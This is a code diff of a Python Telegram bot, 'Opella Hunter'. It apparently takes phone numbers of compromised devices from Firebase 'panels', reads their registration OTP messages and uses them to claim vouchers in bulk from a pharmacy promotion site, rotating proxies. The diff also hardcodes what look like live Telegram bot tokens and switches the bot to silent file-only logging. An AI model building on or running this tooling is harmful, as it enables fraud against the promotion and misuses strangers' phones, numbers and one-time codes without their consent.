@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# Opella Hunter — v15.3 (Panel Debug + Device Fallback + 1000+ Users)
+# Opella Hunter — v15.0 (1000+ Users + Silent File Logs + Admin Panel)
 # Credits: JD
 
 import asyncio, base64, hashlib, hmac, io, json, os, random, re, string, sys, threading, time, itertools, contextvars, zipfile
@@ -26,13 +26,7 @@ from telegram.error import BadRequest, RetryAfter, TimedOut, NetworkError
 # ════════════════════════════════════════════════════════════
 CREDIT    = "JD"
 BOT_NAME  = "Opella Hunter"
-BOT_TOKEN = "8871069553:AAFBHDRPL1FIvdrQOS0KRCgrOhvj4URblxE"
-if not BOT_TOKEN:
-    print("=" * 60, flush=True)
-    print("[FATAL] BOT_TOKEN env variable not set!", flush=True)
-    print("[FATAL] Set BOT_TOKEN in Railway Variables.", flush=True)
-    print("=" * 60, flush=True)
-    sys.exit(1)
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8871069553:AAFE_nTLyLlnXnCL40lfCc5v47lAome6tHU")
 
 FORCE_CHANNELS = [
     {"username": "@camplootersonly", "url": "https://t.me/camplootersonly"},
@@ -43,30 +37,8 @@ FORCE_CHANNELS = [
 CHANNEL_USERNAME = "@camplootersonly"
 CHANNEL_URL      = "https://t.me/camplootersonly"
 
-OWNER_ID = int(os.getenv("OWNER_ID", "8880545620"))
-
-# ⭐ AUTO-DATA_DIR
-def _resolve_data_dir() -> Path:
-    env = os.getenv("DATA_DIR")
-    if env:
-        p = Path(env)
-        try:
-            p.mkdir(parents=True, exist_ok=True)
-            return p
-        except Exception:
-            pass
-    data_p = Path("/data")
-    if data_p.exists() and os.access(data_p, os.W_OK):
-        try:
-            test = data_p / ".write_test"
-            test.write_text("ok")
-            test.unlink()
-            return data_p
-        except Exception:
-            pass
-    return Path(__file__).parent.resolve()
-
-DATA_DIR    = _resolve_data_dir()
+OWNER_ID    = int(os.getenv("OWNER_ID", "8880545620"))
+DATA_DIR    = Path(os.getenv("DATA_DIR", str(Path(__file__).parent.resolve())))
 ADMINS_FILE = DATA_DIR / "admins.json"
 
 # ⭐ SCALE CONFIG
@@ -92,12 +64,12 @@ VOUCHER_FETCH_FAIL_COOLDOWN = 3
 DEVICE_COOLDOWN    = 20
 ANSWERS = [1, 2, 3, 4, 2]
 
-# ⭐ LOG CONFIG
-LOG_DIR       = DATA_DIR / "logs"
+# ⭐ LOG CONFIG — silent file logging
+LOG_DIR        = DATA_DIR / "logs"
 LOG_DIR.mkdir(parents=True, exist_ok=True)
-LOG_FLUSH_SEC = 2.0
-LOG_MAX_BYTES = 5 * 1024 * 1024
-LOG_BACKUPS   = 3
+LOG_FLUSH_SEC  = 2.0     # background flusher interval
+LOG_MAX_BYTES  = 5 * 1024 * 1024   # 5MB rotate
+LOG_BACKUPS    = 3
 
 OPELLA_OTP_PATTERNS = [
     re.compile(r'Your OTP to register is\s+(\d{4,6})', re.IGNORECASE),
@@ -150,9 +122,11 @@ CHANNEL_OK: Dict[str, bool] = {}
 CHANNEL_LOCK = threading.Lock()
 
 # ════════════════════════════════════════════════════════════
-#  FILE LOGGER
+#  ⭐ FILE LOGGER — silent, buffered, rotating
 # ════════════════════════════════════════════════════════════
 class FileLogger:
+    """Buffered, thread-safe, rotating file logger. NO console output."""
+
     def __init__(self, name: str, log_dir: Path, max_bytes: int = LOG_MAX_BYTES,
                  backups: int = LOG_BACKUPS, flush_sec: float = LOG_FLUSH_SEC):
         self.name      = name
@@ -176,12 +150,15 @@ class FileLogger:
 
     def _rotate_if_needed(self):
         try:
-            if not self.path.exists(): return
-            if self.path.stat().st_size < self.max_bytes: return
+            if not self.path.exists():
+                return
+            if self.path.stat().st_size < self.max_bytes:
+                return
             if self._fh:
                 try: self._fh.close()
                 except: pass
                 self._fh = None
+            # rename current → .1, .1 → .2, ...
             for i in range(self.backups, 0, -1):
                 old = self.path.with_suffix(f".log.{i}")
                 if old.exists():
@@ -204,11 +181,14 @@ class FileLogger:
 
     def flush(self):
         with self._lock:
-            if not self._buf: return
+            if not self._buf:
+                return
             lines = self._buf
             self._buf = []
-            if self._fh is None: self._open()
-            if self._fh is None: return
+            if self._fh is None:
+                self._open()
+            if self._fh is None:
+                return
             try:
                 self._fh.write("".join(lines))
                 self._fh.flush()
@@ -224,8 +204,10 @@ class FileLogger:
         with self._lock:
             self._buf.append(line)
             if len(self._buf) > 200:
+                # emergency flush
                 try:
-                    if self._fh is None: self._open()
+                    if self._fh is None:
+                        self._open()
                     if self._fh:
                         self._fh.write("".join(self._buf))
                         self._fh.flush()
@@ -243,6 +225,7 @@ class FileLogger:
                 self._fh = None
 
 
+# Global loggers (created lazily per chat)
 LOGGERS: Dict[int, FileLogger] = {}
 LOGGERS_LOCK = threading.Lock()
 MAIN_LOGGER = FileLogger("main", LOG_DIR)
@@ -258,9 +241,6 @@ def get_user_logger(chat_id: int) -> FileLogger:
 # ════════════════════════════════════════════════════════════
 #  PER-USER PATHS
 # ════════════════════════════════════════════════════════════
-USERS_DIR = DATA_DIR / "users"
-USERS_DIR.mkdir(parents=True, exist_ok=True)
-
 def user_dir(user_id: int) -> Path:
     d = USERS_DIR / str(user_id)
     d.mkdir(parents=True, exist_ok=True)
@@ -279,29 +259,8 @@ def user_paths(user_id: int) -> Dict[str, Path]:
         "fake_sms": d / "fake_sms.log",
     }
 
-# ════════════════════════════════════════════════════════════
-#  ADMIN HELPERS
-# ════════════════════════════════════════════════════════════
-def load_admins() -> Set[int]:
-    if ADMINS_FILE.exists():
-        try:
-            with open(ADMINS_FILE) as f:
-                data = json.load(f)
-                return set(data.get("admins", [])) | {OWNER_ID}
-        except: pass
-    return {OWNER_ID}
-
-def save_admins(admins: Set[int]):
-    try:
-        DATA_DIR.mkdir(parents=True, exist_ok=True)
-        with open(ADMINS_FILE, "w") as f:
-            json.dump({"admins": list(admins)}, f, indent=2)
-    except: pass
-
-ADMINS: Set[int] = load_admins()
-
-def is_admin(user_id: int) -> bool:
-    return user_id in ADMINS or user_id == OWNER_ID
+USERS_DIR = DATA_DIR / "users"
+USERS_DIR.mkdir(parents=True, exist_ok=True)
 
 # ════════════════════════════════════════════════════════════
 #  ICONS
@@ -318,7 +277,7 @@ def esc(s): return str(s).replace("&","&amp;").replace("<","&lt;").replace(">","
 _current_chat = contextvars.ContextVar("current_chat", default=None)
 
 # ════════════════════════════════════════════════════════════
-#  FORCE JOIN
+#  FORCE JOIN (cached channel check)
 # ════════════════════════════════════════════════════════════
 async def _check_single_channel(user_id: int, ch: Dict[str, str]) -> Optional[Dict[str, str]]:
     uname = ch["username"]
@@ -615,56 +574,27 @@ def watch_voucher(user_id, chat_id, fb_url, device_id, phone, tag="", timeout=VO
     return None
 
 # ════════════════════════════════════════════════════════════
-#  DEVICE FETCH — with debug logs
+#  DEVICE FETCH
 # ════════════════════════════════════════════════════════════
 def fetch_devices_for_panel(firebase_url):
-    push_log(f"🔍 [{firebase_url}] fetching clients.json…", "info")
     try:
         r = requests.get(firebase_url + "clients.json", timeout=15, verify=False,
                          proxies=NO_PROXY, headers={"Connection": "keep-alive"})
-        push_log(f"🔍 [{firebase_url}] status={r.status_code} len={len(r.text)}", "info")
-        if r.status_code != 200:
-            push_log(f"❌ panel status {r.status_code} for {firebase_url}", "err")
-            MAIN_LOGGER.write(f"[panel] {firebase_url} status={r.status_code} body={r.text[:200]}")
-            return []
         clients = r.json()
-        if not isinstance(clients, dict):
-            push_log(f"❌ panel returned {type(clients).__name__}, expected dict", "err")
-            MAIN_LOGGER.write(f"[panel] {firebase_url} non-dict response: {r.text[:200]}")
-            return []
+        if not isinstance(clients, dict): clients = {}
     except Exception as e:
-        push_log(f"❌ panel err: {e}", "err")
-        MAIN_LOGGER.write(f"[panel] {firebase_url} exception: {e}")
-        return []
+        push_log(f"  ❌ panel err: {e}", "err"); return []
 
-    total = len(clients)
-    push_log(f"🔍 [{firebase_url}] {total} clients in DB", "info")
-    if total == 0:
-        push_log(f"⚠️ panel DB empty: {firebase_url}", "warn")
-        return []
-
-    # ⭐ Fallback: if no online status field, take ALL clients
     online = []
-    any_status_field = False
     for cid, cd in clients.items():
         if not isinstance(cd, dict): continue
-        status = cd.get("status") or cd.get("online") or cd.get("isOnline") or cd.get("state")
-        if status is not None: any_status_field = True
+        status = cd.get("status") or cd.get("online") or cd.get("isOnline") or cd.get("state") or ""
         if status is True: online.append(cid)
         elif isinstance(status, str) and status.strip().lower() in ("online","active","1","true","yes"): online.append(cid)
         elif isinstance(status, (int,float)) and status == 1: online.append(cid)
 
-    # ⭐ FALLBACK: agar koi status field hi nahi hai, toh saare clients le lo
-    if not online and not any_status_field:
-        online = list(clients.keys())
-        push_log(f"⚠️ no status field — using all {len(online)} clients", "warn")
-        MAIN_LOGGER.write(f"[panel] {firebase_url} no status field, fallback to all {len(online)}")
-
     if not online:
-        push_log(f"⚠️ {firebase_url} → 0 online of {total}", "warn")
-        return []
-
-    push_log(f"🔍 [{firebase_url}] {len(online)} online clients", "info")
+        push_log(f"  ⚠️ no online clients", "warn"); return []
 
     phone_pats = [
         re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b"),
@@ -685,7 +615,7 @@ def fetch_devices_for_panel(firebase_url):
     out = []; seen = set()
     def one(cid):
         cd = clients.get(cid, {})
-        direct = cd.get("phone") or cd.get("mobile") or cd.get("number") or cd.get("phoneNumber")
+        direct = cd.get("phone") or cd.get("mobile") or cd.get("number")
         if direct:
             n = normalize_phone(direct)
             if n: return {"client_id": cid, "phone": n}
@@ -710,9 +640,6 @@ def fetch_devices_for_panel(firebase_url):
                 seen.add(res["phone"])
                 res["firebase_url"] = firebase_url
                 out.append(res)
-
-    push_log(f"✅ [{firebase_url}] {len(out)} devices extracted", "ok")
-    MAIN_LOGGER.write(f"[panel] {firebase_url} → {len(out)}/{len(online)} devices")
     return out
 
 # ════════════════════════════════════════════════════════════
@@ -798,12 +725,6 @@ def _net_call(fn, chat_id, retries=NET_RETRIES, backoff=NET_BACKOFF, on_retry=No
         except Exception as e:
             return {"statusCode": None, "message": f"{type(e).__name__}: {e}"}
     return last or {"statusCode": None, "message": "net retries exhausted"}
-
-BASE_URL = "https://www.worldpharmacistdaybyopella.com"
-API_BASE = f"{BASE_URL}/api"
-UTM_SOURCE = "qrcode"
-UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36")
 
 class OpellaClient:
     def __init__(self, chat_id: int, proxy=None, proxy_pool=None):
@@ -1036,7 +957,7 @@ def flow_for_phone(user_id, chat_id, phone, device_id, fb_url, proxy, tag, st_pa
         except: pass
 
 # ════════════════════════════════════════════════════════════
-#  TELEGRAM STATE
+#  TELEGRAM STATE — LRU bounded
 # ════════════════════════════════════════════════════════════
 CHAT_STATE: "OrderedDict[int, Dict[str, Any]]" = OrderedDict()
 STATE_LOCK = threading.RLock()
@@ -1100,10 +1021,9 @@ def get_render_lock(chat_id):
 #  LOG SYSTEM — silent (file only)
 # ════════════════════════════════════════════════════════════
 def push_log(msg, cls="info"):
+    """Write log ONLY to per-chat log file. NO telegram, NO console."""
     owner = _current_chat.get()
     if owner is None:
-        try: MAIN_LOGGER.write(msg)
-        except: pass
         return
     try:
         get_user_logger(owner).write(msg)
@@ -1352,8 +1272,7 @@ async def _run_panel_inner(user_id, chat_id, fb_url, panel_idx, total_panels):
         )
         if not st_pairs: st_pairs = [("Karnataka", "Bangalore")]
         if not devices:
-            push_log(f"❌ panel {panel_idx}: 0 devices — check panel URL/status", "err")
-            return
+            push_log("no devices", "warn"); return
 
         for d in devices: ensure_number(st, panel_idx, d["phone"])
         st["devices_total"] += len(devices)
@@ -1703,6 +1622,7 @@ async def admin_logs(update, ctx, chat_id):
         await BOT_APP.bot.send_message(chat_id, f"{C['cross']} Admin only."); return
     await BOT_APP.bot.send_message(chat_id, "📜 Compressing logs...")
     try:
+        # Force flush all loggers
         MAIN_LOGGER.flush()
         with LOGGERS_LOCK:
             for lg in LOGGERS.values():
@@ -1892,18 +1812,7 @@ async def post_init(app):
     global MAIN_LOOP, GLOBAL_USER_SEM
     MAIN_LOOP = asyncio.get_running_loop()
     GLOBAL_USER_SEM = asyncio.Semaphore(MAX_USER_SLOTS)
-    print("=" * 60, flush=True)
-    print(f"[startup] {BOT_NAME} v15.3", flush=True)
-    print(f"[startup] DATA_DIR = {DATA_DIR}", flush=True)
-    print(f"[startup] USERS_DIR = {USERS_DIR}", flush=True)
-    print(f"[startup] LOG_DIR = {LOG_DIR}", flush=True)
-    print(f"[startup] ADMINS_FILE = {ADMINS_FILE}", flush=True)
-    print(f"[startup] BOT_TOKEN set = {bool(BOT_TOKEN)}", flush=True)
-    print(f"[startup] OWNER_ID = {OWNER_ID}", flush=True)
-    print(f"[startup] ADMINS = {sorted(ADMINS)}", flush=True)
-    print(f"[startup] MAX_USER_SLOTS = {MAX_USER_SLOTS}", flush=True)
-    print(f"[startup] MAX_WORKERS = {MAX_WORKERS}", flush=True)
-    print("=" * 60, flush=True)
+    MAIN_LOGGER.write(f"[init] MAIN_LOOP captured | user slots={MAX_USER_SLOTS}")
 
     await app.bot.set_my_commands([
         BotCommand("start","Menu"), BotCommand("panel","Add panel(s)"),
@@ -1913,11 +1822,9 @@ async def post_init(app):
         BotCommand("mydir","My folder"), BotCommand("verify","Verify join"),
         BotCommand("admin","Admin panel"), BotCommand("clearpanels","Clear"),
     ])
-    print(f"[startup] Bot commands registered | polling starting...", flush=True)
 
 def main():
     global BOT_APP
-    print("[main] Building Application...", flush=True)
     BOT_APP = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
 
     BOT_APP.add_handler(CommandHandler("start", cmd_start))
@@ -1936,7 +1843,7 @@ def main():
     BOT_APP.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
     BOT_APP.add_error_handler(error_handler)
 
-    print("[main] Handlers registered | calling run_polling...", flush=True)
+    # NO print to console — everything goes to logs/ directory
     BOT_APP.run_polling(
         allowed_updates=Update.ALL_TYPES,
         drop_pending_updates=True,
